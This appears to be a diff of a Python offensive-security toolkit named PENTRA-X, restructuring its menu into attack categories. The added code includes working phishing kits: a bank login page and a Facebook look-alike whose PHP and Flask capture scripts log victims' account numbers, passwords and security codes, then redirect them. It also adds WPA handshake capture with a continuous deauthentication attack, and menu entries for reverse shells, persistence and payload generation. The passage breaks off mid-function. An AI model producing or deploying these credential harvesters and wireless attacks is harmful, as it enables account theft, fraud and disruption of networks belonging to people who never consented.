+    
+    if template_choice == "1":
+        create_banking_template()
+    elif template_choice == "2":
+        create_social_media_template()
+    elif template_choice == "3":
+        create_email_template()
+    elif template_choice == "4":
+        create_cloud_template()
+    elif template_choice == "5":
+        create_gaming_template()
+    elif template_choice == "6":
+        create_corporate_template()
+    elif template_choice == "7":
+        custom_template_builder()
+
+def automated_phishing_campaign():
+    print("[+] Automated Phishing Campaign")
+    print("[!] This will create a complete phishing campaign setup.")
+    
+    campaign_name = input("Campaign name: ").strip()
+    if not campaign_name:
+        campaign_name = f"campaign_{int(time.time())}"
+    
+    campaign_dir = f"phish_campaign_{campaign_name}"
+    os.makedirs(campaign_dir, exist_ok=True)
+    
+    print("[!] Campaign components:")
+    print("1. Phishing page")
+    print("2. Email templates")
+    print("3. Target list")
+    print("4. Tracking system")
+    print("5. Reporting dashboard")
+    
+    # Create campaign structure
+    os.makedirs(f"{campaign_dir}/pages", exist_ok=True)
+    os.makedirs(f"{campaign_dir}/emails", exist_ok=True)
+    os.makedirs(f"{campaign_dir}/targets", exist_ok=True)
+    os.makedirs(f"{campaign_dir}/logs", exist_ok=True)
+    os.makedirs(f"{campaign_dir}/reports", exist_ok=True)
+    
+    print(f"[+] Campaign structure created: {campaign_dir}/")
+    print("[+] Next steps:")
+    print("  1. Create phishing pages in pages/")
+    print("  2. Add email templates in emails/")
+    print("  3. Add target list in targets/")
+    print("  4. Deploy tracking system")
+    print("  5. Monitor results in logs/")
+
+def phishing_server_setup():
+    print("[+] Phishing Server Setup")
+    print("[!] Setting up professional phishing server...")
+    
+    print("[!] Choose server type:")
+    print("1. Apache + PHP")
+    print("2. Nginx + PHP")
+    print("3. Python Flask")
+    print("4. Node.js Express")
+    print("5. Docker container")
+    
+    server_choice = input("Select server type (1-5): ").strip()
+    
+    if server_choice == "1":
+        setup_apache_php_server()
+    elif server_choice == "2":
+        setup_nginx_php_server()
+    elif server_choice == "3":
+        setup_flask_server()
+    elif server_choice == "4":
+        setup_express_server()
+    elif server_choice == "5":
+        setup_docker_server()
+
+# Helper functions for phishing templates
+def create_banking_template():
+    print("[+] Creating Banking/Financial Template")
+    folder = "phish_banking"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Secure Banking Login</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
+            .container { max-width: 400px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo h1 { color: #2c3e50; margin: 0; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; background: #3498db; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+            button:hover { background: #2980b9; }
+            .security-notice { background: #e8f4fd; padding: 10px; border-radius: 4px; margin-top: 20px; font-size: 12px; color: #2c3e50; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <h1>🏦 SecureBank</h1>
+                <p>Secure Online Banking</p>
+            </div>
+            <form action="capture.php" method="post">
+                <input type="text" name="account_number" placeholder="Account Number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="text" name="security_code" placeholder="Security Code" required>
+                <button type="submit">Secure Login</button>
+            </form>
+            <div class="security-notice">
+                🔒 This is a secure connection. Your information is protected by SSL encryption.
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Account: " . $_POST['account_number'] . "\\n";
+        $data .= "Password: " . $_POST['password'] . "\\n";
+        $data .= "Security Code: " . $_POST['security_code'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://www.google.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Banking template created in {folder}/")
+
+def create_social_media_template():
+    print("[+] Creating Social Media Template")
+    folder = "phish_social"
+    os.makedirs(folder, exist_ok=True)
+    
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Facebook - Log In or Sign Up</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
+            .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+            .logo { text-align: center; margin-bottom: 30px; }
+            .logo h1 { color: #1877f2; margin: 0; font-size: 40px; }
+            input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            button { width: 100%; background: #1877f2; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+            button:hover { background: #166fe5; }
+            .forgot { text-align: center; margin-top: 20px; }
+            .forgot a { color: #1877f2; text-decoration: none; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <h1>facebook</h1>
+            </div>
+            <form action="capture.php" method="post">
+                <input type="email" name="email" placeholder="Email or phone number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="forgot">
+                <a href="#">Forgotten password?</a>
+            </div>
+        </div>
+    </body>
+    </html>
+    """
+    
+    with open(f"{folder}/index.html", "w") as f:
+        f.write(html)
+    
+    # Create capture script
+    php_capture = """
+    <?php
+    if ($_POST) {
+        $data = "Email: " . $_POST['email'] . "\\n";
+        $data .= "Password: " . $_POST['password'] . "\\n";
+        $data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
+        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
+        $data .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\\n";
+        $data .= "---\\n";
+        file_put_contents('captured.txt', $data, FILE_APPEND);
+    }
+    header('Location: https://www.facebook.com');
+    ?>
+    """
+    
+    with open(f"{folder}/capture.php", "w") as f:
+        f.write(php_capture)
+    
+    print(f"[+] Social media template created in {folder}/")
+
+# Server setup functions
+def setup_apache_php_server():
+    print("[+] Setting up Apache + PHP server...")
+    
+    # Install Apache and PHP
+    subprocess.run(["sudo", "apt", "update"])
+    subprocess.run(["sudo", "apt", "install", "-y", "apache2", "php", "php-mysql"])
+    
+    # Create phishing directory
+    phish_dir = "/var/www/html/phish"
+    subprocess.run(["sudo", "mkdir", "-p", phish_dir])
+    subprocess.run(["sudo", "chown", "-R", "$USER:$USER", phish_dir])
+    
+    print(f"[+] Apache server configured at {phish_dir}")
+    print("[+] Upload phishing files to this directory")
+    print("[+] Access via: http://your-ip/phish/")
+
+def setup_flask_server():
+    print("[+] Setting up Python Flask server...")
+    
+    # Create Flask app
+    flask_app = """
+from flask import Flask, request, render_template_string, redirect
+import json
+from datetime import datetime
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template_string('''
+    <!DOCTYPE html>
+    <html>
+    <head><title>Phishing Page</title></head>
+    <body>
+        <h1>Phishing Page</h1>
+        <p>This is a Flask-based phishing server.</p>
+    </body>
+    </html>
+    ''')
+
+@app.route('/capture', methods=['POST'])
+def capture():
+    data = request.form
+    log_entry = {
+        'timestamp': datetime.now().isoformat(),
+        'ip': request.remote_addr,
+        'user_agent': request.headers.get('User-Agent'),
+        'data': dict(data)
+    }
+    
+    with open('captured.json', 'a') as f:
+        f.write(json.dumps(log_entry) + '\\n')
+    
+    return redirect('https://www.google.com')
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080, debug=False)
+    """
+    
+    with open("phish_server.py", "w") as f:
+        f.write(flask_app)
+    
+    print("[+] Flask server created: phish_server.py")
+    print("[+] Run with: python3 phish_server.py")
+    print("[+] Access via: http://your-ip:8080/")
+
+def wifi_scan_advanced_wrapper():
+    print("[+] Advanced WiFi Network Scanner - Professional wireless reconnaissance")
+    print("[!] This requires monitor mode and root privileges.")
+    
+    if not check_root():
+        print("[-] Root privileges required.")
+        return
+    
+    # Check if aircrack-ng tools are available
+    if shutil.which("airodump-ng") is None:
+        print("[-] aircrack-ng suite not found. Installing...")
+        ensure_installed("airodump-ng", "aircrack-ng")
+        if shutil.which("airodump-ng") is None:
+            print("[-] Could not install aircrack-ng. Please install manually.")
+            return
+    
+    # Get available wireless interfaces
+    print("[+] Detecting wireless interfaces...")
+    try:
+        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
+        interfaces = []
+        for line in result.stdout.split('\n'):
+            if 'IEEE 802.11' in line and 'no wireless extensions' not in line:
+                iface = line.split()[0]
+                interfaces.append(iface)
+        
+        if not interfaces:
+            print("[-] No wireless interfaces found.")
+            return
+        
+        print(f"[+] Found wireless interfaces: {', '.join(interfaces)}")
+    except Exception as e:
+        print(f"[-] Could not detect interfaces: {e}")
+        interfaces = ["wlan0", "wlan1", "wlan2"]
+    
+    iface = input(f"Wireless interface ({', '.join(interfaces)}): ").strip()
+    if not iface:
+        iface = interfaces[0] if interfaces else "wlan0"
+    
+    print("[!] Choose scan type:")
+    print("1. Quick scan (basic network list)")
+    print("2. Detailed scan (with clients and signal strength)")
+    print("3. Continuous monitoring (save to file)")
+    print("4. Channel-specific scan")
+    print("5. WPS-enabled networks scan")
+    print("6. Hidden networks detection")
+    
+    choice = input("Select scan type (1-6, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        print("[+] Quick WiFi scan")
+        try:
+            # Use iwlist for basic scan
+            result = subprocess.run(["sudo", "iwlist", iface, "scan"], capture_output=True, text=True)
+            if result.returncode == 0:
+                print("[+] Quick scan results:")
+                networks = []
+                current_network = {}
+                
+                for line in result.stdout.split('\n'):
+                    if 'ESSID:' in line:
+                        essid = line.split('"')[1] if '"' in line else "Hidden"
+                        current_network['ESSID'] = essid
+                    elif 'Address:' in line:
+                        bssid = line.split()[-1]
+                        current_network['BSSID'] = bssid
+                    elif 'Channel:' in line:
+                        channel = line.split()[-1]
+                        current_network['Channel'] = channel
+                    elif 'Encryption key:' in line:
+                        encryption = "WEP" if "on" in line else "Open"
+                        current_network['Encryption'] = encryption
+                    elif 'Quality=' in line and current_network:
+                        quality = line.split('=')[1].split()[0]
+                        current_network['Quality'] = quality
+                        networks.append(current_network.copy())
+                        current_network = {}
+                
+                if networks:
+                    print(f"\n[+] Found {len(networks)} networks:")
+                    print(f"{'ESSID':<20} {'BSSID':<18} {'Channel':<8} {'Encryption':<10} {'Quality':<8}")
+                    print("-" * 70)
+                    for net in networks:
+                        essid = net.get('ESSID', 'Hidden')[:18]
+                        bssid = net.get('BSSID', 'Unknown')
+                        channel = net.get('Channel', 'Unknown')
+                        encryption = net.get('Encryption', 'Unknown')
+                        quality = net.get('Quality', 'Unknown')
+                        print(f"{essid:<20} {bssid:<18} {channel:<8} {encryption:<10} {quality:<8}")
+                else:
+                    print("[-] No networks found.")
+            else:
+                print("[-] Quick scan failed.")
+        except Exception as e:
+            print(f"[-] Quick scan failed: {e}")
+    
+    elif choice == "2":
+        print("[+] Detailed WiFi scan with airodump-ng")
+        try:
+            # Start monitor mode
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            # Check if monitor interface exists
+            if not os.path.exists(f"/sys/class/net/{mon_iface}"):
+                # Try alternative naming
+                for alt_name in [f"{iface}_mon", f"{iface}mon"]:
+                    if os.path.exists(f"/sys/class/net/{alt_name}"):
+                        mon_iface = alt_name
+                        break
+            
+            print(f"[+] Monitor interface: {mon_iface}")
+            print("[!] Starting detailed scan...")
+            print("[!] Press Ctrl+C to stop scan")
+            
+            # Run airodump-ng with output to file
+            output_file = f"wifi_scan_{int(time.time())}.csv"
+            cmd = ["sudo", "airodump-ng", "-w", output_file.replace('.csv', ''), "--output-format", "csv", mon_iface]
+            
+            proc = subprocess.Popen(cmd)
+            try:
+                proc.wait()
+            except KeyboardInterrupt:
+                print("\n[!] Scan interrupted by user.")
+                proc.terminate()
+            
+            # Stop monitor mode
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+            
+            # Parse results
+            if os.path.exists(output_file):
+                print(f"\n[+] Scan results saved to {output_file}")
+                try:
+                    with open(output_file, 'r') as f:
+                        content = f.read()
+                        lines = content.split('\n')
+                        networks = []
+                        
+                        for line in lines:
+                            if line.strip() and ',' in line and 'BSSID' not in line:
+                                parts = line.split(',')
+                                if len(parts) >= 14:
+                                    bssid = parts[0].strip()
+                                    if bssid and bssid != "00:00:00:00:00:00":
+                                        network = {
+                                            'BSSID': bssid,
+                                            'First_time': parts[1].strip(),
+                                            'Last_time': parts[2].strip(),
+                                            'Channel': parts[3].strip(),
+                                            'Speed': parts[4].strip(),
+                                            'Privacy': parts[5].strip(),
+                                            'Cipher': parts[6].strip(),
+                                            'Authentication': parts[7].strip(),
+                                            'Power': parts[8].strip(),
+                                            'Beacons': parts[9].strip(),
+                                            'IV': parts[10].strip(),
+                                            'LAN_IP': parts[11].strip(),
+                                            'ID_length': parts[12].strip(),
+                                            'ESSID': parts[13].strip()
+                                        }
+                                        networks.append(network)
+                        
+                        if networks:
+                            print(f"\n[+] Found {len(networks)} networks:")
+                            print(f"{'ESSID':<20} {'BSSID':<18} {'Channel':<8} {'Privacy':<8} {'Power':<6}")
+                            print("-" * 65)
+                            for net in networks[:20]:  # Show first 20
+                                essid = net['ESSID'][:18] if net['ESSID'] else "Hidden"
+                                bssid = net['BSSID']
+                                channel = net['Channel']
+                                privacy = net['Privacy']
+                                power = net['Power']
+                                print(f"{essid:<20} {bssid:<18} {channel:<8} {privacy:<8} {power:<6}")
+                            
+                            if len(networks) > 20:
+                                print(f"... and {len(networks) - 20} more networks")
+                        else:
+                            print("[-] No networks found.")
+                except Exception as e:
+                    print(f"[-] Could not parse results: {e}")
+        except Exception as e:
+            print(f"[-] Detailed scan failed: {e}")
+    
+    elif choice == "3":
+        print("[+] Continuous WiFi monitoring")
+        duration = input("Duration in seconds (default 60): ").strip() or "60"
+        output_file = f"wifi_monitor_{int(time.time())}.csv"
+        
+        try:
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            print(f"[+] Monitoring for {duration} seconds...")
+            print(f"[+] Output file: {output_file}")
+            
+            cmd = ["timeout", duration, "sudo", "airodump-ng", "-w", output_file.replace('.csv', ''), "--output-format", "csv", mon_iface]
+            subprocess.run(cmd)
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+            
+            print(f"[+] Monitoring completed. Results saved to {output_file}")
+        except Exception as e:
+            print(f"[-] Monitoring failed: {e}")
+    
+    elif choice == "4":
+        print("[+] Channel-specific scan")
+        channel = input("Channel number (1-14): ").strip()
+        if not channel or not channel.isdigit() or int(channel) < 1 or int(channel) > 14:
+            print("[-] Invalid channel. Using channel 6.")
+            channel = "6"
+        
+        try:
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            print(f"[+] Scanning channel {channel}...")
+            cmd = ["sudo", "airodump-ng", "-c", channel, mon_iface]
+            subprocess.run(cmd)
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+        except Exception as e:
+            print(f"[-] Channel scan failed: {e}")
+    
+    elif choice == "5":
+        print("[+] WPS-enabled networks scan")
+        try:
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            print("[+] Scanning for WPS-enabled networks...")
+            cmd = ["sudo", "wash", "-i", mon_iface]
+            subprocess.run(cmd)
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+        except Exception as e:
+            print(f"[-] WPS scan failed: {e}")
+            print("[!] Wash tool not available. Install reaver-wps package.")
+    
+    elif choice == "6":
+        print("[+] Hidden networks detection")
+        try:
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            print("[+] Scanning for hidden networks...")
+            print("[!] This may take longer as we wait for probe responses...")
+            
+            cmd = ["sudo", "airodump-ng", "--hidden", mon_iface]
+            subprocess.run(cmd)
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+        except Exception as e:
+            print(f"[-] Hidden network scan failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def wifi_handshake_advanced_wrapper():
+    print("[+] Advanced WPA Handshake Capture - Professional wireless attack")
+    print("[!] This requires monitor mode and root privileges.")
+    
+    if not check_root():
+        print("[-] Root privileges required.")
+        return
+    
+    iface = input("Wireless interface (e.g. wlan0): ").strip()
+    if not iface:
+        print("[-] Interface required.")
+        return
+    
+    bssid = input("Target BSSID (AP MAC): ").strip()
+    if not bssid:
+        print("[-] BSSID required.")
+        return
+    
+    channel = input("Channel: ").strip()
+    if not channel:
+        print("[-] Channel required.")
+        return
+    
+    print("[!] Choose capture method:")
+    print("1. Passive capture (wait for handshake)")
+    print("2. Active capture (deauth attack)")
+    print("3. Continuous deauth")
+    
+    choice = input("Select method (1-3, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        wifi_handshake_capture()
+    elif choice == "2":
+        print("[+] Active capture with deauth")
+        wifi_handshake_capture()
+    elif choice == "3":
+        print("[+] Continuous deauth attack")
+        client = input("Target client MAC (optional): ").strip()
+        duration = input("Duration in seconds (default 30): ").strip() or "30"
+        
+        try:
+            subprocess.run(["sudo", "airmon-ng", "start", iface])
+            mon_iface = iface + "mon"
+            
+            if client:
+                cmd = ["timeout", duration, "sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, mon_iface]
+            else:
+                cmd = ["timeout", duration, "sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
+            
+            subprocess.run(cmd)
+            subprocess.run(["sudo", "airmon-ng", "stop", mon_iface])
+        except Exception as e:
+            print(f"[-] Deauth failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+# Categorized menu system
+categorized_menus = {
+    "Network Reconnaissance": [
+        ("1. ARP Scan", arp_scan_wrapper),
+        ("2. Port Scan", port_scan_wrapper),
+        ("3. Nmap Advanced Scan", nmap_advanced_wrapper),
+        ("4. Network Enumeration", None),  # Placeholder for future
     ],
-    [
-        ("11. Gobuster Dir Scan", lambda: gobuster_scan(input("Target URL (http/https): "))),
-        ("12. Nmap Full Scan", lambda: nmap_scan(input("Target for Nmap: "))),
-        ("13. Hydra Login Bruteforce", lambda: hydra_scan(input("Target IP: "), input("Username: "), input("Service (e.g. ssh, ftp): "))),
-        ("14. SQLMap Injection Scan", lambda: sqlmap_scan(input("URL vulnerable to SQLi: "))),
-        ("15. Social Engineering Toolkit (SET)", setoolkit),
-        ("16. Fake Email Spoof (local test)", spoof_email),
-        ("17. Phishing Page Generator", phishing_page),
-        ("18. OSINT Wordlist Generator", osint_wordlist_generator),
-        ("19. WiFi Network Scan", wifi_scan),
-        ("20. Capture WPA Handshake", wifi_handshake_capture),
-        ("21. Advanced XSS Testing", advanced_xss_test),
-        ("22. Advanced LFI/RFI Testing", advanced_lfi_rfi_test),
-        ("23. Advanced CSRF Testing", advanced_csrf_test),
-        ("24. Advanced Web Vulnerability Scanner", advanced_web_vuln_scan),
-        ("25. Advanced SSRF Testing", advanced_ssrf_test),
-        ("26. Advanced SMB/NTLM/LDAP Brute-force", advanced_smb_bruteforce),
-        ("27. Advanced Hashdump & Offline Password Cracking", advanced_hashdump_crack),
-        ("28. Advanced DHCP Starvation/Poisoning", advanced_dhcp_attack),
-        ("29. Advanced SNMP Enumeration", advanced_snmp_enum),
-        ("30. Advanced IPv6 Attacks", advanced_ipv6_attacks),
-        ("99. Next Page", None),
-        ("0. Back", None)
+    
+    "Web Testing & Exploitation": [
+        ("1. Gobuster Directory Scan", gobuster_wrapper),
+        ("2. SQLMap Injection Scan", sqlmap_advanced_wrapper),
+        ("3. Advanced XSS Testing", advanced_xss_test),
+        ("4. Advanced LFI/RFI Testing", advanced_lfi_rfi_test),
+        ("5. Advanced CSRF Testing", advanced_csrf_test),
+        ("6. Advanced Web Vulnerability Scanner", advanced_web_vuln_scan),
+        ("7. Advanced SSRF Testing", advanced_ssrf_test),
+        ("8. Directory Bruteforce", dir_brute_wrapper),
     ],
-    [
-        ("23. Crack WPA Handshake", wifi_crack_handshake),
-        ("24. Automated WiFi Attack (Wifite)", wifi_wifite),
-        ("25. Reverse Shell (TCP)", reverse_shell),
-        ("26. Generate Reverse Shell Payload", generate_reverse_shell_payload),
-        ("27. Start Listener (Netcat)", start_listener),
-        ("28. Generate Persistence Script", generate_persistence_script),
-        ("29. Generate msfvenom Payload", generate_msfvenom_payload),
-        ("30. Advanced MITM Attacks", mitm_menu),
-        ("31. WiFi MITM Attacks", wifi_mitm_menu),
-        ("0. Back", None)
+    
+    "Wireless Attacks": [
+        ("1. WiFi Network Scan", wifi_scan_advanced_wrapper),
+        ("2. Capture WPA Handshake", wifi_handshake_advanced_wrapper),
+        ("3. Crack WPA Handshake", wifi_crack_handshake),
+        ("4. Automated WiFi Attack (Wifite)", wifi_wifite),
+        ("5. WiFi MITM Attacks", wifi_mitm_menu),
+    ],
+    
+    "Social Engineering": [
+        ("1. BlackEye Phishing Framework", blackeye_phishing),
+        ("2. SocialFish Phishing Framework", socialfish_phishing),
+        ("3. HiddenEye Phishing Framework", hiddeneye_phishing),
+        ("4. Advanced Site Cloner", advanced_site_cloner),
+        ("5. Social Engineering Toolkit (SET)", setoolkit_advanced_wrapper),
+        ("6. Fake Email Spoof", email_spoof_advanced_wrapper),
+        ("7. Phishing Page Generator", phishing_advanced_wrapper),
+    ],
+    
+    "Password Attacks": [
+        ("1. Hydra Login Bruteforce", hydra_advanced_wrapper),
+        ("2. Crack SHA256 Hash", crack_hash_wrapper),
+        ("3. Advanced SMB/NTLM/LDAP Brute-force", advanced_smb_bruteforce),
+        ("4. Advanced Hashdump & Offline Password Cracking", advanced_hashdump_crack),
+    ],
+    
+    "MITM & Network Attacks": [
+        ("1. Advanced MITM Attacks", mitm_menu),
+        ("2. ARP Spoofing", arp_spoof),
+        ("3. DNS Spoofing", dns_spoof),
+        ("4. Advanced DHCP Starvation/Poisoning", advanced_dhcp_attack),
+        ("5. Advanced SNMP Enumeration", advanced_snmp_enum),
+        ("6. Advanced IPv6 Attacks", advanced_ipv6_attacks),
+    ],
+    
+    "Information Gathering": [
+        ("1. Whois Lookup", whois_wrapper),
+        ("2. DNS Lookup", dns_wrapper),
+        ("3. SSL Certificate Info", ssl_wrapper),
+        ("4. Subdomain Finder", subdomain_wrapper),
+        ("5. HTTP Headers", headers_wrapper),
+        ("6. CVE Search", cve_wrapper),
+        ("7. OSINT Toolkit", osint_menu),
+        ("8. OSINT Wordlist Generator", osint_wordlist_generator),
+    ],
+    
+    "Post Exploitation": [
+        ("1. Reverse Shell (TCP)", reverse_shell),
+        ("2. Generate Reverse Shell Payload", generate_reverse_shell_payload),
+        ("3. Start Listener (Netcat)", start_listener),
+        ("4. Generate Persistence Script", generate_persistence_script),
+        ("5. Generate msfvenom Payload", generate_msfvenom_payload),
     ]
+}
+
+# Main menu categories
+main_categories = [
+    "Network Reconnaissance",
+    "Web Testing & Exploitation", 
+    "Wireless Attacks",
+    "Social Engineering",
+    "Password Attacks",
+    "MITM & Network Attacks",
+    "Information Gathering",
+    "Post Exploitation"
 ]
 
-# --- InquirerPy for interactive main menu selection ---
-INQUIRERPY_AVAILABLE = False
-try:
-    from InquirerPy import inquirer  # type: ignore
-    INQUIRERPY_AVAILABLE = True
-except ImportError:
+def show_category_menu(category):
+    """Display menu for a specific category"""
+    print(f"\n{Colors.OKCYAN}=== {category} ==={Colors.ENDC}")
+    tools = categorized_menus[category]
+    
+    for i, (tool_name, tool_func) in enumerate(tools, 1):
+        # Extract the tool name without the number
+        clean_name = tool_name.split('. ', 1)[1] if '. ' in tool_name else tool_name
+        print(f"{Colors.OKCYAN}{i}.{Colors.ENDC} {clean_name}")
+    
+    print(f"{Colors.OKCYAN}0.{Colors.ENDC} Back to Main Menu")
+    
+    choice = input(f"\n[{category}] Select Option > ").strip()
+    
+    if choice == "0":
+        return
+    
     try:
-        import subprocess
-        import sys
-        print("[!] InquirerPy not found. Attempting to install via pip...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "InquirerPy"])
-        from InquirerPy import inquirer  # type: ignore
-        INQUIRERPY_AVAILABLE = True
-        print("[+] InquirerPy installed successfully.")
-    except Exception as e:
-        print(f"[-] Failed to install InquirerPy: {e}\n[!] Falling back to classic input mode.")
-        INQUIRERPY_AVAILABLE = False
-
-# Helper for interactive menu selection
-def interactive_menu_select(options, message="Select Option > ", tooltips=None):
-    if not INQUIRERPY_AVAILABLE:
-        # Fallback to classic input
-        print("\n".join([f"{i+1}. {opt}" for i, opt in enumerate(options)]))
-        return input(message).strip()
-    choices = []
-    for i, opt in enumerate(options):
-        if tooltips and i < len(tooltips):
-            choices.append({"name": opt, "value": str(i+1), "tooltip": tooltips[i]})
-        else:
-            choices.append({"name": opt, "value": str(i+1)})
-    result = inquirer.select(
-        message=message,
-        choices=choices,
-        instruction="Use arrow keys to navigate, Enter to select."
-    ).execute()
-    return result
-
-def print_core_menu(page):
-    menu_text = "\n" + "\n".join([item[0] for item in core_menus[page]]) + "\n"
-    print_menu_no_clear(menu_text)
-
-current_page = 0
-while True:
-    print_core_menu(current_page)
-    menu = core_menus[current_page]
-    # Build options for interactive menu
-    options = [label for (label, action) in menu]
-    # Optionally, add tooltips for each menu item (can be improved later)
-    tooltips = [None for _ in options]  # Placeholder, can add descriptions
-    if INQUIRERPY_AVAILABLE:
-        # Remove color codes for InquirerPy display
-        import re
-        options_clean = [re.sub(r'\x1b\[[0-9;]*m', '', opt) for opt in options]
-        choice = interactive_menu_select(options_clean, message="Main Menu > ", tooltips=tooltips)
-        # Map back to menu index
-        idx = int(choice) - 1 if choice.isdigit() and 0 < int(choice) <= len(menu) else -1
-    else:
-        choice = input("Select Option > ").strip()
-        idx = -1
-        for i, (label, _) in enumerate(menu):
-            num = label.split(".")[0]
-            if choice == num:
-                idx = i
-                break
-    found = False
-    if 0 <= idx < len(menu):
-        label, action = menu[idx]
-        found = True
-        if label.endswith("Exit"):
-            print("Exiting...")
-            exit()
-        elif label.endswith("Back"):
-            current_page = max(0, current_page - 1)
-            continue
-        elif label.endswith("Next Page"):
-            if current_page < len(core_menus) - 1:
-                current_page += 1
+        choice_num = int(choice)
+        if 1 <= choice_num <= len(tools):
+            tool_name, tool_func = tools[choice_num - 1]
+            if tool_func:
+                tool_func()
             else:
-                print("[!] No more pages.")
-            continue
-        elif action:
-            action()
-            continue
-    if not found:
-            print("Invalid option.")
+                print(f"[-] {tool_name} - Coming soon!")
+        else:
+            print("[-] Invalid option.")
+    except ValueError:
+        print("[-] Invalid input.")
+
+def show_main_menu():
+    """Display the main categorized menu"""
+    print(f"\n{Colors.OKCYAN}=== PENTRA-X MAIN MENU ==={Colors.ENDC}")
+    print(f"{Colors.WARNING}Choose a category:{Colors.ENDC}\n")
+    
+    for i, category in enumerate(main_categories, 1):
+        print(f"{Colors.OKCYAN}{i}.{Colors.ENDC} {category}")
+    
+    print(f"{Colors.OKCYAN}0.{Colors.ENDC} Exit")
+    
+    choice = input(f"\n{Colors.OKGREEN}Select Category > {Colors.ENDC}").strip()
+    
+    if choice == "0":
+        print("Exiting...")
+        exit()
+    
+    try:
+        choice_num = int(choice)
+        if 1 <= choice_num <= len(main_categories):
+            selected_category = main_categories[choice_num - 1]
+            show_category_menu(selected_category)
+        else:
+            print("[-] Invalid option.")
+    except ValueError:
+        print("[-] Invalid input.")
+
+# Replace the old menu system with the new categorized one
+def main_menu():
+    """Main menu loop with categorized tools"""
+    while True:
+        show_main_menu()
+
+# Update the main execution to use the new categorized menu system
+if __name__ == "__main__":
+    check_and_prompt_dependencies()
+    main_menu()
+
+def auto_integrate_tools():
+    """Automatically integrate newly installed tools into the menu system"""
+    print(f"{Colors.OKCYAN}[+] Auto-Integrating Tools into Menu System{Colors.ENDC}")
+    
+    # Define tool integrations
+    tool_integrations = {
+        "Network Reconnaissance": [
+            ("subfinder", "Subfinder Subdomain Enumeration", "subfinder_wrapper"),
+            ("amass", "Amass Network Mapping", "amass_wrapper"),
+            ("naabu", "Naabu Port Scanner", "naabu_wrapper"),
+            ("httpx", "HTTPX Web Scanner", "httpx_wrapper"),
+            ("nuclei", "Nuclei Vulnerability Scanner", "nuclei_wrapper"),
+            ("photon", "Photon Web Crawler", "photon_wrapper"),
+        ],
+        
+        "Web Testing & Exploitation": [
+            ("wpscan", "WPScan WordPress Scanner", "wpscan_wrapper"),
+            ("nikto", "Nikto Web Vulnerability Scanner", "nikto_wrapper"),
+            ("whatweb", "WhatWeb Web Technology Detector", "whatweb_wrapper"),
+        ],
+        
+        "Information Gathering": [
+            ("sherlock", "Sherlock Username Enumeration", "sherlock_wrapper"),
+            ("theharvester", "TheHarvester Email/Subdomain Enumeration", "theharvester_wrapper"),
+            ("recon-ng", "Recon-ng Reconnaissance Framework", "recon_ng_wrapper"),
+            ("shodan", "Shodan Search", "shodan_wrapper"),
+        ],
+        
+        "Social Engineering": [
+            ("wifiphisher", "Wifiphisher WiFi Phishing", "wifiphisher_wrapper"),
+        ]
+    }
+    
+    # Check for newly installed tools and create wrappers
+    for category, tools in tool_integrations.items():
+        for tool_cmd, tool_name, wrapper_name in tools:
